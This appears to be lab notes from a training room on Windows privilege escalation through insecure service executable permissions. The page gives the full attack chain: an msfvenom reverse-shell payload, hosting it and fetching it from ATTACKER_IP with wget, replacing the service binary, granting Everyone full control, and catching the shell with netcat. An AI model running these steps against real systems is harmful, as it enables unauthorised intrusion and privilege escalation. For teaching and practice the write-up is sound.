---
sidebar_position: 1
---

# Insecure Permissions [Service]

- <b style={{ color: 'DeepSkyBlue' }}>WindowsScheduler</b> Service has <span style={{fontWeight: 'Bold'}}>Weak Permissions</span> that allows the Modification - Replacing it is possible to gain the Privileges of the Service.

- **The Service runs as User:** `svcusr1`

```log
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser
```

<br/>

- Group <b style={{ color: 'PowderBlue' }}>Everyone:(I)(M)</b> has <span style={{fontWeight: 'Bold'}}>Modify</span> Permissions on the Service Executable.

```log
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

<br/>

- Generating the **PAYLOAD** and **HOSTING** using Simple Python Server.

```log
attacker@machine:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
attacker@machine:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- Downloading the Executable on the **Target Machine.**

```bash
C:\> wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

<br/>

- Replacing the Service Executable with our **PAYLOAD.**
- We need another User to execute the **PAYLOAD**, so we grant Full Permission to the **Everyone Group:** <b style={{ color: 'PowderBlue' }}>Everyone:(F)</b>

```powershell
C:\> cd C:\PROGRA~2\SYSTEM~1\
C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
```

<br/>

- Starting a `netcat` Listener
- Restarting the <b style={{ color: 'DeepSkyBlue' }}>WindowsScheduler</b> Service. <span style={{fontWeight: 'Bold'}}>(In a Normal case Scenario we would have to Wait for a Service Restart)</span>

```log
C:\> sc stop  "windowsscheduler"
C:\> sc start "windowsscheduler"
```

```bash
attacker@machine:~$ nc -lvp 4445
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
wprivesc1\svcusr1
```